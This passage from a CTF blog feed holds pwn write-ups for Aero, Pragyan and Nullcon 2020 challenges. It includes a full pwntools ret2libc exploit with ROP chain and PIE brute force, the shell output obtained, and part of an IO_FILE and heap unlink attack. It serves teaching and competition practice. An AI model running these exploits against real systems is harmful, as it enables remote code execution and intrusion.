p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x200</span>) <span class="comment"># IO_helper_jumps</span></span><br><span class="line">        STDERR = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stderr_'</span>]) <span class="comment"># stderr</span></span><br><span class="line">        STDOUT = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]) <span class="comment"># stdout</span></span><br><span class="line">        STDIN = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># stdin</span></span><br><span class="line">        INPUT = _IO_2_1_stdout_+STDERR+STDIN+STDOUT+p64(<span class="number">0</span>)*<span class="number">2</span>*<span class="number">17</span>+p64(<span class="number">0</span>)+p64(LIBC+<span class="number">0x80650</span>)+p64(LIBC+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">        change_plane_name(<span class="number">-2</span>, INPUT, <span class="keyword">False</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">https://vigneshsrao.github.io/babytcache/</a> </li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Plane Market&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;416pts&lt;/p&gt;
&lt;p&gt;Solvers ???&lt;/p&gt;
&lt;p&gt;…&lt;/p&gt;
&lt;p&gt;&lt;a
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="IO_FILE" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"/>
    
    
      <category term="file_stream" scheme="https://teamrocketist.github.io/tags/file-stream/"/>
    
      <category term="io_file" scheme="https://teamrocketist.github.io/tags/io-file/"/>
    
      <category term="io_file_struct" scheme="https://teamrocketist.github.io/tags/io-file-struct/"/>
    
      <category term="aero2020" scheme="https://teamrocketist.github.io/tags/aero2020/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Pragyan 2020 - Hide and Seek</title>
    <link href="https://teamrocketist.github.io/2020/02/24/Pwn-Pragyan-2020-Hide-and-Seek/"/>
    <id>https://teamrocketist.github.io/2020/02/24/Pwn-Pragyan-2020-Hide-and-Seek/</id>
    <published>2020-02-24T19:32:05.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Hide and Seek </p></blockquote><blockquote><p><strong>Description</strong>:<br>150pts</p><p>Solvers 11</p><p>Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost his toy! Can you help him find it?</p><p>First solvers: OpenToAll</p><p><a href="https://mega.nz/#!ujgSBQaT!tCy4Nkkoz--jIJb9Ag4_kmeGO-X1mjXBNmcz5GuJY-s" target="_blank" rel="noopener">gps</a> 1760946c1646ecf61192e545c2e9ac4a<br><a href="https://mega.nz/#!TmxwBAJA!pXFWRLZap_kHbepOZtyy-Kus9DSTRiq6xZXr2WKrgJc" target="_blank" rel="noopener">libc-2.27.so</a> 50390b2ae8aaa73c47745040f54e602f<br>nc ctf.pragyan.org 17000</p></blockquote><h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>This challenge had a very <strong>few</strong> solves, maybe because <strong>most</strong> people gave up after the <a href="https://blog.rwx.kr/how-pragyan-ctf-2020-hacked/" target="_blank" rel="noopener">hack</a>. Another reason is probably because when trying to get a <strong>shell</strong> with system on the server it returns segmentation fault due to an <strong>alignment</strong> problem, this is an issue I also had in a previous ctf (CSAW 2019) and the fix is pretty simple as I will explain bellow.</p><h3 id="Extracting-info"><a href="#Extracting-info" class="headerlink" title="Extracting info"></a>Extracting info</h3><p>Everything is enabled besides the <strong>stack canary</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec gpsu</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/hideandseek/gpsu'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>From the file command we know that the binary is <strong>dynamically linked</strong> so we know it’s going to use a shared library of libc.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file gpsu</span><br><span class="line">gpsu: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2b53545d7df75c5dd56122820cf4806f2be749d3, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>There is an obvious <strong>buffer overflow</strong> vulnerability in scanf, we also partially got a <strong>leak</strong> of the <strong>PIE</strong> address, which is necessary if we want to leak addresses from the <strong>GOT</strong> and to build a <strong>ropchain</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/0lL6GDk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0lL6GDk.png" alt><br></a></p><h3 id="Writing-the-exploit"><a href="#Writing-the-exploit" class="headerlink" title="Writing the exploit"></a>Writing the exploit</h3><p>First thing we want to do is to get the pie address some numbers from it we already know because they’re not affected by the ALSR:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xXXXXXXXX?000</span><br></pre></td></tr></table></figure><p>The ones we already know is the <strong>last 3</strong> which is <strong>3 zeros</strong>, the <strong>“Xs”</strong> are leaked from the <strong>binary</strong> from those printfs but we are missing one number which is denoted with a <strong>“?”</strong>. The solution to this is to brute-force <strong>this number</strong>, a <strong>4 bit</strong> bruteforce shouldn’t take much time even when connecting remotely.</p><p>So to form the pie address we can do this in python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="string">'0xXXXXXXXX4000'</span> <span class="comment"># 8 bit brute-force (random guess of "?" with the number 4)</span></span><br><span class="line">addr = list(addr)</span><br><span class="line">indexes = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">  r.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">  addr[i]=r.recv(<span class="number">1</span>).decode()</span><br><span class="line">  r.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">  PIE = int(<span class="string">''</span>.join(addr),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>To <strong>brute-force</strong> every try we need to put this in a <strong>loop</strong> until we get the right address, if we succeed we can leak a <strong>libc address</strong> from the <strong>GOT</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROP_CHAIN = p64(POPRDI) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ROP_CHAIN += p64(PIE+elf.got[<span class="string">'fgets'</span>]) <span class="comment"># fgets@got</span></span><br><span class="line">ROP_CHAIN += p64(PIE+<span class="number">0x10e0</span>) <span class="comment"># r2 -&gt; ?v sym.imp.puts</span></span><br><span class="line">ROP_CHAIN += p64(MAIN) <span class="comment"># return to main     </span></span><br><span class="line">r.sendlineafter(<span class="string">'---\n'</span>, <span class="string">b'A'</span>*<span class="number">38</span>+ROP_CHAIN)</span><br></pre></td></tr></table></figure><p>The author didn’t release any <strong>libc file</strong>, because of this I used a very nice <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">tool</a>, from the leaked address, we can use the find command to get the right libc version:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ /libc-database/find fgets 0x7f0916d25b20</span><br><span class="line">http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)</span><br><span class="line">$ /libc-database/download libc6_2.27-3ubuntu1_amd64</span><br><span class="line">Getting libc6_2.27-3ubuntu1_amd64</span><br><span class="line">  -&gt; Location: http://mirrors.kernel.org/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb</span><br><span class="line">  -&gt; Downloading package</span><br><span class="line">  -&gt; Extracting package</span><br><span class="line">  -&gt; Package saved to libs/libc6_2.27-3ubuntu1_amd64</span><br><span class="line">$ cp /libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc-2.27.so .</span><br></pre></td></tr></table></figure><p>Next thing to do is to calculate the offsets:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FGETS = u64(r.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">LIBC = FGETS-libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBC+next(libc.search(<span class="string">b'/bin/sh\x00'</span>))</span><br><span class="line">log.info(<span class="string">'FGETS 0x%x'</span>, FGETS)</span><br><span class="line">log.info(<span class="string">'LIBC 0x%x'</span>, LIBC)</span><br></pre></td></tr></table></figure><p>Now its time to build a ropchain that executes <strong>system(“/bin/sh\x00”);</strong>, this is probably where most people got stuck, if we build a ropchain like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROP_CHAIN = p64(POPRDI) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ROP_CHAIN += p64(BINSH)</span><br><span class="line">ROP_CHAIN += p64(SYSTEM) <span class="comment"># system(rdi=&amp;/bin/sh);</span></span><br><span class="line">ROP_CHAIN += p64(MAIN)</span><br><span class="line">r.sendlineafter(<span class="string">'---\n'</span>, <span class="string">b'A'</span>*<span class="number">38</span>+ROP_CHAIN)</span><br></pre></td></tr></table></figure><p>Locally everything runs smoothly but when running at the server it always segfaults , basically our payload needs to be aligned within a 16 byte multiple, so to fix the alignment on the remote machine we can just add another rop instruction <strong>ret</strong> between <strong>BINSH</strong> and <strong>SYSTEM</strong> which in the end doesn’t do anything but will fix the alignment on the server machine:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROP_CHAIN = p64(POPRDI) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ROP_CHAIN += p64(BINSH)</span><br><span class="line">ROP_CHAIN += p64(RET) <span class="comment"># ret  Won't work on server without this</span></span><br><span class="line">ROP_CHAIN += p64(SYSTEM) <span class="comment"># system(rdi=&amp;/bin/sh);</span></span><br><span class="line">ROP_CHAIN += p64(MAIN)</span><br><span class="line">r.sendlineafter(<span class="string">'---\n'</span>, <span class="string">b'A'</span>*<span class="number">38</span>+ROP_CHAIN)</span><br></pre></td></tr></table></figure><p>With this we can get a shell remotely:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to ctf.pragyan.org on port 17000: Done</span><br><span class="line">[*] 0x55df3d9c4000</span><br><span class="line">...</span><br><span class="line">[+] Opening connection to ctf.pragyan.org on port 17000: Done</span><br><span class="line">[*] 0x556cd8114000</span><br><span class="line">[*] FGETS 0x7f9e7ed7bb20</span><br><span class="line">[*] LIBC 0x7f9e7ecfd000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">|5|   |6|   |d|   |1|</span><br><span class="line">---   ---   ---   ---</span><br><span class="line"></span><br><span class="line">     YOU ARE HERE      </span><br><span class="line">          O            </span><br><span class="line">---   ---   ---   ---</span><br><span class="line">|5|   |c|   |8|   |1|</span><br><span class="line">---   ---   ---   ---</span><br><span class="line">$ cat bin/flag.txt</span><br><span class="line">p_ctf&#123;M@p_SPac3s_h3lP_pe0pl3_N@viG@t3&#125;</span><br><span class="line">$ id</span><br><span class="line">uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"ctf.pragyan.org"</span>, <span class="string">"17000"</span></span><br><span class="line">filename = <span class="string">"./gpsu"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"r"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = getConn()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">            debug([<span class="number">0x143b</span>]) <span class="comment"># 0x131a</span></span><br><span class="line"></span><br><span class="line">        addr = <span class="string">'0xXXXXXXXX4000'</span> <span class="comment"># 4 bit bruteforce</span></span><br><span class="line">        addr = list(addr)</span><br><span class="line">        indexes = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            r.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">            addr[i]=r.recv(<span class="number">1</span>).decode()</span><br><span class="line">            r.recvuntil(<span class="string">'|'</span>)</span><br><span class="line"></span><br><span class="line">        PIE = int(<span class="string">''</span>.join(addr),<span class="number">16</span>)</span><br><span class="line">        RET = PIE+<span class="number">0x000000000000101a</span> <span class="comment"># ret</span></span><br><span class="line">        POPRDI = PIE+<span class="number">0x00000000000014d3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">        MAIN = PIE+<span class="number">0x143c</span></span><br><span class="line">        log.info(<span class="string">'0x%x'</span>% PIE)</span><br><span class="line"></span><br><span class="line">        ROP_CHAIN = p64(POPRDI)</span><br><span class="line">        ROP_CHAIN += p64(PIE+elf.got[<span class="string">'fgets'</span>])</span><br><span class="line">        ROP_CHAIN += p64(PIE+<span class="number">0x10e0</span>) <span class="comment"># r2 -&gt; ?v sym.imp.puts</span></span><br><span class="line">        ROP_CHAIN += p64(MAIN)</span><br><span class="line">        <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">        r.sendlineafter(<span class="string">'---\n'</span>, <span class="string">b'A'</span>*<span class="number">38</span>+ROP_CHAIN)</span><br><span class="line"></span><br><span class="line">        FGETS = u64(r.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">        LIBC = FGETS-libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">        SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">        BINSH = LIBC+next(libc.search(<span class="string">b'/bin/sh\x00'</span>))</span><br><span class="line">        log.info(<span class="string">'FGETS 0x%x'</span>, FGETS)</span><br><span class="line">        log.info(<span class="string">'LIBC 0x%x'</span>, LIBC)</span><br><span class="line"></span><br><span class="line">        ROP_CHAIN = p64(POPRDI)</span><br><span class="line">        ROP_CHAIN += p64(BINSH)</span><br><span class="line">        ROP_CHAIN += p64(RET) <span class="comment"># Won't work on server without this</span></span><br><span class="line">        ROP_CHAIN += p64(SYSTEM)</span><br><span class="line">        ROP_CHAIN += p64(MAIN)</span><br><span class="line">        r.sendlineafter(<span class="string">'---\n'</span>, <span class="string">b'A'</span>*<span class="number">38</span>+ROP_CHAIN)</span><br><span class="line"></span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Hide and Seek &lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;150pts&lt;/p&gt;
&lt;p&gt;Solvers 11&lt;/p&gt;
&lt;p&gt;Little Joe
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Nullcon 2020 - DarkHonya</title>
    <link href="https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-DarkHonya/"/>
    <id>https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-DarkHonya/</id>
    <published>2020-02-09T17:14:55.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Description</strong>:<br>437 Points   </p><p>nc pwn2.ctf.nullcon.net 5002</p><p><a href="https://mega.nz/#!rjZEHaSK!cKlPuwgZAEeYLWNaeLKLin_tQg71R-ew_ghbp9U5V8c" target="_blank" rel="noopener">challenge</a></p><p>5b2f9b7d0b20ae7a694ae61c9de0c204</p><p><a href="https://mega.nz/#!DyRmnQwA!ZlSi4vNo_F9DDxvxTeMIhdOAV-vijn1Q7wlZiLbjZQQ" target="_blank" rel="noopener">libc-2.23.so</a></p><p>8c0d248ea33e6ef17b759fa5d81dda9e</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Use <strong>off by one</strong> vulnerability to set next chunk <strong>prev_on_use</strong> bit to zero </li><li>Use <strong>unlink</strong> attack to write a <strong>global addr</strong> to the <strong>global pointer list</strong></li><li>Edit <strong>global pointer</strong> list with <strong>exit_got</strong> and <strong>atoi_got</strong></li><li>Use edit to overwrite <strong>atoi_got</strong> with <strong>printf</strong></li><li>Use <strong>format string</strong> to leak libc</li><li>Edit <strong>exit_got</strong> with onegadget</li></ul><h3 id="Basic-information"><a href="#Basic-information" class="headerlink" title="Basic information"></a>Basic information</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file challenge</span><br><span class="line">challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=6ea21ef679ff8d18a6bb9d2dc8914f2689871e20, stripped</span><br><span class="line">$ checksec challenge</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/darkHonya/challenge'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>As you can see, the program is <strong>64-bit</strong>, <strong>Canary</strong> and <strong>Pie</strong> off, writeable <strong>GOT</strong> and <strong>NX</strong> is enabled.</p><h3 id="Basic-functions"><a href="#Basic-functions" class="headerlink" title="Basic functions"></a>Basic functions</h3><p>There are 4 functions in the program. After some static analysis, the functions can be analysed as follows:</p><p><strong>Name:</strong> Insert a name, data is stored in a global variable<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">insertNameBss_4009FD</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"----- BookStore -----"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"finally! a customer, what is your name?"</span>);</span><br><span class="line">  editString_400830(byte_6020A0);</span><br><span class="line">  <span class="built_in">puts</span>(byte_6020A0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Welcome %s\n"</span>, byte_6020A0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>Buy book:</strong> Allocates a chunk of size 0xF8, and records the corresponding chunk pointer in the bss segment (ptr list).<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buyAbook_40087C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ptr[i]; ++i );</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">15</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Next time bring a bag with you!"</span>);</span><br><span class="line">  v1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0xF8</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Name of the book?"</span>);</span><br><span class="line">  editString_400830(v1);</span><br><span class="line">  result = i;</span><br><span class="line">  ptr[i] = v1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>Return a book:</strong> releases the allocated memory 